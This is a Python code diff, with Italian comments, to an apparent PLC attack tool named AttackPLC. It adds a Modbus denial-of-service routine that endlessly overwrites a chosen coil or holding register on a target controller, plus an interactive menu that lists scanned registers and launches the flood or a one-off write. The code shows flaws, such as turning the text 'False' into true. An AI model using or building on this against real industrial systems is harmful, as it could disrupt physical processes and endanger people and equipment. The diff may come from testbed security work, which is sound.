@@ -379,6 +379,28 @@ class AttackPLC:
     input("Done. Press Enter to continue ")
 
   """
+  Metodo che andrà in un thread per l'attacco DoS a un registro
+  """
+  def dos_attack(self, plc, reg_type, modbus_addr, value):
+    mb = ModbusClient(plc, 502)
+    mb.connect()
+  
+    if(reg_type == "coil"):
+      addr = modbus_addr / 8
+      addr = int(addr)
+      register = modbus_addr % 8
+
+      print(f"DoS attack on %QX{addr}.{register}")
+      while(True):
+        mb.write_single_coil(int(modbus_addr), bool(value))
+
+    elif(reg_type == "register"):
+      while(True):
+        mb.write_single_register(int(modbus_addr), int(value))
+    
+    mb.close()
+
+  """
   Cambio il valore di un registro sulla PLC
   """
   def changeRegisterValue(self, single_plc=False):
@@ -452,7 +474,7 @@ class AttackPLC:
 
       plc_list = json.loads(plc_list)
 
-      print("Available PLCs: ")
+      print("Available PLCs from scan: ")
       counter = 1
       for i in plc_list:
         #if(os.path.exists(f'{plc_list[plc]}.json')):
@@ -468,16 +490,58 @@ class AttackPLC:
           self.scan_single_plc()
 
       with open(f'{plc_list[str(choice)]}.json', 'r') as sp:
-        plc = sp.read()
+        plc_data = sp.read()
 
-      plc = json.loads(plc)
+      plc_data = json.loads(plc_data)
+      
+      for ip in plc_data:
+        plc = ip
+
       print(plc)
 
+      print("Available registers and values: \n")
+
+      for key, val in plc_data.items():
+        print("Reg     | val")
+        print("-------------")
+
+        for holreg, val2 in plc_data[key]['HoldingOutputRegisters'].items():
+          print(holreg + '    | ' + val2)
+
+        print("        | ")
+
+        for coilreg, val3 in plc_data[key]['Coils'].items():
+          print(coilreg + ' | ' + val3)
+
+      choice_reg = input("Select register: ")
 
 
+      if(choice_reg[2] == "X" or choice_reg[2] == "x"):
+        reg_type = "coil"
 
+        ind = choice_reg.split(choice_reg[2])[1]
+        addr = int(ind.split('.')[0]) * 8
+        register = int(ind.split('.')[1])
+        modbus_addr = addr + register
+        value = input("Enter new value [True/False]: ")
 
+        loop = input("Do you want to perform a DoS on the register? [y/n] ")
+        
+        if(loop == "y" or loop == "Y"):
+          thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, modbus_addr, bool(value)))
+          thr1.start()
+        else:
+          mb = ModbusClient(plc, 502)
+          mb.connect()
 
+          mb.write_single_coil(modbus_addr, bool(value))
+
+          mb.close()
+
+      elif(choice_reg[2] == "W" or choice_reg[2] == "w"):
+        reg_type = "register"
+
+    time.sleep(1) # Altrimenti mi sballa la stampa in caso di thread
     input("Done. Presse Enter to continue: ")
 
   """
@@ -519,7 +583,7 @@ def main():
     elif(choice == "5"):
       pass
     elif(choice == "6"):
-      quit()
+      os._exit(1)
     else:
       print("Invalid choice\n")
 
